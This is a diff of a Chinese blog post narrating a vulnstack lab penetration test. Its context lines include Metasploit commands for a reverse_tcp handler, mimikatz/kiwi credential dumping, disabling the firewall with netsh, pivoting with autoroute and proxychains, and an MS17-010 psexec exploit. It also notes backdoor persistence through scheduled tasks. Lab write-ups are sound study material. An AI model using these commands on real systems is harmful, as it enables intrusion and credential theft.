 <h5 id="cs自动化插件"><a href="#cs自动化插件" class="headerlink" title="cs自动化插件"></a>cs自动化插件</h5><p><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1484238">CobaltStrike权限维持及其自动化-腾讯云开发者社区-腾讯云 (tencent.com)</a></p>
 <h5 id="更多维权技巧"><a href="#更多维权技巧" class="headerlink" title="更多维权技巧"></a>更多维权技巧</h5><p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/system/229209.html">权限维持及后门持久化技巧总结 - FreeBuf网络安全行业门户</a></p>
-<h4 id="密码收集"><a href="#密码收集" class="headerlink" title="密码收集"></a>密码收集</h4><h5 id="hashdump"><a href="#hashdump" class="headerlink" title="hashdump"></a>hashdump</h5><p>使用msf的hashdump功能，可直接获取用户密码的md5值<img src="/2023/11/30/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/image-20231201153045335.png" srcset="/img/loading.gif" lazyload alt="image-20231201153045335"></p>
+<h4 id="密码收集"><a href="#密码收集" class="headerlink" title="密码收集"></a>密码收集</h4><h5 id="hashdump"><a href="#hashdump" class="headerlink" title="hashdump"></a>hashdump</h5><p>使用msf的hashdump功能，可直接获取用户密码的md5值<img src="/2023/11/30/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-1/image-20231201153045335.png" srcset="/img/loading.gif" lazyload alt="image-20231201153045335"></p>
 <h5 id="Mimikatz"><a href="#Mimikatz" class="headerlink" title="Mimikatz"></a>Mimikatz</h5><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_40412037/article/details/113348310">内网渗透神器（Mimikatz）——使用教程-CSDN博客</a></p>
 <p>前文已经拿到了system权限，利用相关工具可从系统或注册表获取明文密码(需上传mimikatz工具)</p>
 <h5 id="kiwi"><a href="#kiwi" class="headerlink" title="kiwi"></a>kiwi</h5><p>msf上内置了mimikatz模块，改名为kiwi，可以直接使用</p>
 <figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment"># meterpreter &gt;</span><br><br><span class="hljs-comment"># 先进程迁移(之前传递的后门文件是32位的，需要迁移到任意64位进程)</span><br><span class="hljs-attribute">ps</span><br><span class="hljs-attribute">migrate</span> <span class="hljs-number">384</span>(任意<span class="hljs-number">64</span>位进程pid)<br><br><span class="hljs-attribute">load</span> kiwi<br><span class="hljs-attribute">kiwi_cmd</span> sekurlsa::logonpasswords<br></code></pre></td></tr></table></figure>
 
-<p><img src="/2023/11/30/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/image-20231201154424561.png" srcset="/img/loading.gif" lazyload alt="image-20231201154424561"> </p>
+<p><img src="/2023/11/30/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-1/image-20231201154424561.png" srcset="/img/loading.gif" lazyload alt="image-20231201154424561"> </p>
 <h4 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h4><p>我们目前取得了win7的管理员权限，下一步发现内网其他主机、扫描漏洞并尝试利用</p>
 <h5 id="靶机下载文件"><a href="#靶机下载文件" class="headerlink" title="靶机下载文件"></a>靶机下载文件</h5><p>我们拿到一个靶机的shell后，可能会有在靶机上下载或上传文件的需要，有些在攻击机上，有些在网络环境(不出网的就只能通过其他靶机的代理或者内网穿透)</p>
 <ol>
@@ -453,9 +457,9 @@
 </li>
 </ul>
 <h5 id="内网收集2-cs代理"><a href="#内网收集2-cs代理" class="headerlink" title="内网收集2 - cs代理"></a>内网收集2 - cs代理</h5><ol>
-<li><p>先生成一个win后门程序，按照前文方式，依次上传、运行、创建定时任务、隐藏文件(如果一开始就用cs神器也没这么多事了hhh)<img src="/2023/11/30/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/image-20231201171640358.png" srcset="/img/loading.gif" lazyload alt="image-20231201171640358"></p>
+<li><p>先生成一个win后门程序，按照前文方式，依次上传、运行、创建定时任务、隐藏文件(如果一开始就用cs神器也没这么多事了hhh)<img src="/2023/11/30/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-1/image-20231201171640358.png" srcset="/img/loading.gif" lazyload alt="image-20231201171640358"></p>
 </li>
-<li><p>关于cs的安装和使用参考文章末尾相关资源，此处直接走socks代理<img src="/2023/11/30/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/image-20231201171841342.png" srcset="/img/loading.gif" lazyload alt="image-20231201171841342"></p>
+<li><p>关于cs的安装和使用参考文章末尾相关资源，此处直接走socks代理<img src="/2023/11/30/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-1/image-20231201171841342.png" srcset="/img/loading.gif" lazyload alt="image-20231201171841342"></p>
 </li>
 <li><p>修改 <code>/etc/proxychains.conf</code> 的 sock4 为 <code>127.0.0.1 11451</code> , 并在<code>meterpreter</code> 中执行以下命令</p>
 <figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dns">setg Proxies socks<span class="hljs-number">4:127.0.0</span>.<span class="hljs-number">1:11451</span><br></code></pre></td></tr></table></figure>
@@ -463,12 +467,12 @@
 <li><p>接下来便可以利用我们本地的工具进行扫描</p>
 <figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment"># netdiscover</span><br><span class="hljs-attribute">proxychains</span> netdiscover<br><br><span class="hljs-comment"># nmap</span><br><span class="hljs-attribute">proxychains</span> nmap -A -sS -sV <span class="hljs-number">192.168.52.138</span>/<span class="hljs-number">24</span><br></code></pre></td></tr></table></figure>
 
-<p>速度感人<img src="/2023/11/30/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/image-20231202113659562.png" srcset="/img/loading.gif" lazyload alt="image-20231202113659562"></p>
+<p>速度感人<img src="/2023/11/30/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-1/image-20231202113659562.png" srcset="/img/loading.gif" lazyload alt="image-20231202113659562"></p>
 </li>
 <li><p>换个思路，在靶机上上传nmap进行扫描(桌面截图发现居然自带的有)，地址为 <code> C:\Program Files (x86)\Nmap</code> </p>
 <figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">shell</span> nmap -A -sS -sV <span class="hljs-number">192.168.52.138</span>/<span class="hljs-number">24</span><br></code></pre></td></tr></table></figure>
 
-<p><img src="/2023/11/30/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/image-20231202115734625.png" srcset="/img/loading.gif" lazyload alt="image-20231202115734625"><img src="/2023/11/30/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/image-20231202115808187.png" srcset="/img/loading.gif" lazyload alt="image-20231202115808187"><img src="/2023/11/30/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/image-20231202120036461.png" srcset="/img/loading.gif" lazyload alt="image-20231202120036461"><img src="/2023/11/30/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/image-20231202120108061.png" srcset="/img/loading.gif" lazyload alt="image-20231202120108061"></p>
+<p><img src="/2023/11/30/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-1/image-20231202115734625.png" srcset="/img/loading.gif" lazyload alt="image-20231202115734625"><img src="/2023/11/30/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-1/image-20231202115808187.png" srcset="/img/loading.gif" lazyload alt="image-20231202115808187"><img src="/2023/11/30/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-1/image-20231202120036461.png" srcset="/img/loading.gif" lazyload alt="image-20231202120036461"><img src="/2023/11/30/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-1/image-20231202120108061.png" srcset="/img/loading.gif" lazyload alt="image-20231202120108061"></p>
 </li>
 </ol>
 <h5 id="内网收集3-msf路由"><a href="#内网收集3-msf路由" class="headerlink" title="内网收集3 - msf路由"></a>内网收集3 - msf路由</h5><p>上面的cs代理不知道抽什么风用不了，这里改用msf的路由</p>
@@ -486,44 +490,44 @@
 <li><p>按照之前的方式依次上传、隐藏、计划任务、并在msf进行监听，此时再开启路由模块便正常了</p>
 <figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-comment"># msf</span><br>use exploit/multi/handler<br><span class="hljs-built_in">set</span> payload windows/x64/meterpreter/reverse_tcp<br><span class="hljs-built_in">set</span> lhost 192.168.48.129<br><span class="hljs-built_in">set</span> lport 4444<br>exploit<br><br><span class="hljs-comment"># meterpreter&gt;</span><br><span class="hljs-built_in">run</span> post/multi/manage/autoroute<br></code></pre></td></tr></table></figure>
 
-<p><img src="/2023/11/30/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/image-20231202192155216.png" srcset="/img/loading.gif" lazyload alt="image-20231202192155216"></p>
+<p><img src="/2023/11/30/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-1/image-20231202192155216.png" srcset="/img/loading.gif" lazyload alt="image-20231202192155216"></p>
 </li>
 <li><p>路由开启后我们尝试进行arp扫描，非常的舒服啊</p>
 <figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-comment"># meterpreter&gt;</span><br><span class="hljs-built_in">run</span> post/windows/gather/arp_scanner <span class="hljs-attribute">rhosts</span>=192.168.52.0/24<br><br><span class="hljs-comment"># 当前会话挂后台</span><br>bg(background)<br></code></pre></td></tr></table></figure>
 
-<p><img src="/2023/11/30/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/image-20231203115302684.png" srcset="/img/loading.gif" lazyload alt="image-20231203115302684"></p>
+<p><img src="/2023/11/30/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-1/image-20231203115302684.png" srcset="/img/loading.gif" lazyload alt="image-20231203115302684"></p>
 </li>
 </ol>
 <h5 id="横向移动"><a href="#横向移动" class="headerlink" title="横向移动"></a>横向移动</h5><ol>
 <li><p>nmap漏扫插件扫一扫</p>
 <figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-comment"># cs beacon&gt;</span><br><span class="hljs-built_in">shell</span> nmap <span class="hljs-comment">--script=vuln 192.168.52.141</span><br></code></pre></td></tr></table></figure>
 
-<p><img src="/2023/11/30/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/image-20231202121821429.png" srcset="/img/loading.gif" lazyload alt="image-20231202121821429"></p>
+<p><img src="/2023/11/30/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-1/image-20231202121821429.png" srcset="/img/loading.gif" lazyload alt="image-20231202121821429"></p>
 <p>ms08-067  ms17-010</p>
 </li>
-<li><p>需要先关闭win7的防火墙，否则会出现以下内容<img src="/2023/11/30/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/image-20231202143323918.png" srcset="/img/loading.gif" lazyload alt="image-20231202143323918"></p>
+<li><p>需要先关闭win7的防火墙，否则会出现以下内容<img src="/2023/11/30/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-1/image-20231202143323918.png" srcset="/img/loading.gif" lazyload alt="image-20231202143323918"></p>
 <figure class="highlight pf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pf"><span class="hljs-comment"># 关闭防火墙 cs beacon&gt;</span><br>shell netsh advfirewall <span class="hljs-built_in">set</span> allprofiles <span class="hljs-keyword">state</span> off<br></code></pre></td></tr></table></figure>
 </li>
 <li><p>前面拿到了内网的路由(或者代理)，此处用msf进行漏洞发现和利用</p>
 <figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-comment"># msf&gt;</span><br>use auxiliary/scanner/smb/smb_ms17_010<br>show options<br><span class="hljs-built_in">set</span> rhosts 192.168.52.138/24<br><span class="hljs-built_in">set</span> threads 50<br>run<br></code></pre></td></tr></table></figure>
 
-<p><img src="/2023/11/30/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/image-20231203120354256.png" srcset="/img/loading.gif" lazyload alt="image-20231203120354256"></p>
+<p><img src="/2023/11/30/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-1/image-20231203120354256.png" srcset="/img/loading.gif" lazyload alt="image-20231203120354256"></p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">use exploit/windows/smb/ms17_010_psexec<br><span class="hljs-built_in">set</span> rhost 192.168.52.141<br><span class="hljs-built_in">set</span> payload windows/meterpreter/bind_tcp(必须是<span class="hljs-built_in">bind</span>)<br>run<br></code></pre></td></tr></table></figure>
 
-<p>失败…换个靶机…失败…换个漏洞…还是失败…<img src="/2023/11/30/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/image-20231203122046969.png" srcset="/img/loading.gif" lazyload alt="image-20231203122046969"><img src="/2023/11/30/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/image-20231203122212018.png" srcset="/img/loading.gif" lazyload alt="image-20231203122212018"><img src="/2023/11/30/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/image-20231203122249273.png" srcset="/img/loading.gif" lazyload alt="image-20231203122249273"></p>
+<p>失败…换个靶机…失败…换个漏洞…还是失败…<img src="/2023/11/30/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-1/image-20231203122046969.png" srcset="/img/loading.gif" lazyload alt="image-20231203122046969"><img src="/2023/11/30/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-1/image-20231203122212018.png" srcset="/img/loading.gif" lazyload alt="image-20231203122212018"><img src="/2023/11/30/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-1/image-20231203122249273.png" srcset="/img/loading.gif" lazyload alt="image-20231203122249273"></p>
 </li>
 <li><p>各种方法都不行，别人一打一个准，我一打一个不吱声。<del>不学了呜呜呜</del></p>
 </li>
 </ol>
-<h5 id="检查失败原因"><a href="#检查失败原因" class="headerlink" title="检查失败原因"></a>检查失败原因</h5><p>漏洞探测模块是没问题的，能通过路由发现存在漏洞，攻击的时候出了问题，探测不到开放的端口，利用msf的代理模块加个 <code>proxychains</code> nmap试试<img src="/2023/11/30/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/image-20231203124202191.png" srcset="/img/loading.gif" lazyload alt="image-20231203124202191"></p>
+<h5 id="检查失败原因"><a href="#检查失败原因" class="headerlink" title="检查失败原因"></a>检查失败原因</h5><p>漏洞探测模块是没问题的，能通过路由发现存在漏洞，攻击的时候出了问题，探测不到开放的端口，利用msf的代理模块加个 <code>proxychains</code> nmap试试<img src="/2023/11/30/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-1/image-20231203124202191.png" srcset="/img/loading.gif" lazyload alt="image-20231203124202191"></p>
 <p>嘶，这代理就没用，再次尝试cs的代理，也没用…</p>
 <h5 id="内网收集4-nps"><a href="#内网收集4-nps" class="headerlink" title="内网收集4 - nps"></a>内网收集4 - nps</h5><p>没办法了，在靶机传一个npc，利用我们以前搭建在阿里云上的nps进行一下代理服务。</p>
-<p>破防了哥，还是没用，代理是挂上去了，但是用的时候出问题，想不明白<img src="/2023/11/30/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/image-20231203150644924.png" srcset="/img/loading.gif" lazyload alt="image-20231203150644924"></p>
+<p>破防了哥，还是没用，代理是挂上去了，但是用的时候出问题，想不明白<img src="/2023/11/30/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-1/image-20231203150644924.png" srcset="/img/loading.gif" lazyload alt="image-20231203150644924"></p>
 <h5 id="放弃？"><a href="#放弃？" class="headerlink" title="放弃？"></a>放弃？</h5><p>思考不出来，搜不到，放弃了吗？nonono 还有一招，问！</p>
-<p>把遇到的问题简化一下拿去问问 xlc <img src="/2023/11/30/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/image-20231203151835605.png" srcset="/img/loading.gif" lazyload alt="image-20231203151835605"></p>
+<p>把遇到的问题简化一下拿去问问 xlc <img src="/2023/11/30/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-1/image-20231203151835605.png" srcset="/img/loading.gif" lazyload alt="image-20231203151835605"></p>
 <p>好了，现在大家都知道我是拿nmap挂代理的憨批了，代理不稳定确实是比较重要的原因，因为是内网就下意识忽略了网络原因，回到内网收集2&#x2F;3，经过我反复的测试，终于确定，走不通。。。</p>
-<p>累了，不搞了  </p>
-<h3 id="相关资源"><a href="#相关资源" class="headerlink" title="相关资源"></a>相关资源</h3><p><a target="_blank" rel="noopener" href="https://github.com/guchangan1/All-Defense-Tool">guchangan1&#x2F;All-Defense-Tool: 全网优秀攻防武器工具项目搜集</a></p>
+<h5 id="魔幻世界"><a href="#魔幻世界" class="headerlink" title="魔幻世界"></a>魔幻世界</h5><p>最后在xlc的指导下搞了几个小时，实在没办法了，直接把靶机放在kali的网卡下尝试漏扫，好家伙直接没洞了，xlc说我环境日坏了，我去重新下了2003靶机，还是扫不出来，换热点就又行了？？(万恶的校园网) 但是换热点也只是能扫到洞，还是利用不了，未果，寻病终…</p>
+<h4 id="相关资源"><a href="#相关资源" class="headerlink" title="相关资源"></a>相关资源</h4><p><a target="_blank" rel="noopener" href="https://github.com/guchangan1/All-Defense-Tool">guchangan1&#x2F;All-Defense-Tool: 全网优秀攻防武器工具项目搜集</a></p>
 <p><a target="_blank" rel="noopener" href="https://github.com/TryGOTry/CobaltStrike_Cat_4.5">TryGOTry&#x2F;CobaltStrike_Cat_4.5: 猫猫Cs:基于Cobalt Strike_4.5二开 (原dogcs二开移植) (github.com)</a></p>
 <p><a target="_blank" rel="noopener" href="https://github.com/k8gege/Ladon">k8gege&#x2F;Ladon: Ladon大型内网渗透工具</a></p>
 
@@ -535,6 +539,17 @@
               <div class="post-metas my-3">
   
   
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/%E8%A7%A3%E9%A2%98%E8%AE%B0%E5%BD%95/" class="print-no-link">#解题记录</a>
+      
+        <a href="/tags/%E5%AD%A6%E4%B9%A0/" class="print-no-link">#学习</a>
+      
+        <a href="/tags/vulnstack/" class="print-no-link">#vulnstack</a>
+      
+    </div>
+  
 </div>
 
 
@@ -543,8 +558,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>vulnstack靶场日记</div>
-      <div>https://just1greed.github.io/2023/11/30/vulnstack靶场日记/</div>
+      <div>vulnstack靶场日记-1</div>
+      <div>https://just1greed.github.io/2023/11/30/vulnstack靶场日记-1/</div>
     </div>
     <div class="license-meta">
       
@@ -562,7 +577,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>更新于</div>
-          <div>2023年12月3日</div>
+          <div>2023年12月4日</div>
         </div>
       
       
@@ -593,9 +608,9 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2023/12/04/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-2/" title="vulnstack靶场日记-2">
+                      <a href="/2023/11/30/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/" title="vulnstack靶场日记">
                         <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">vulnstack靶场日记-2</span>
+                        <span class="hidden-mobile">vulnstack靶场日记</span>
                         <span class="visible-mobile">上一篇</span>
                       </a>
                     
@@ -603,8 +618,8 @@
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2023/11/30/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-1/" title="vulnstack靶场日记-1">
-                        <span class="hidden-mobile">vulnstack靶场日记-1</span>
+                      <a href="/2023/11/26/%E7%BD%91%E5%AE%89%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0%E4%B8%AD/" title="网安学习笔记(持续更新中)">
+                        <span class="hidden-mobile">网安学习笔记(持续更新中)</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
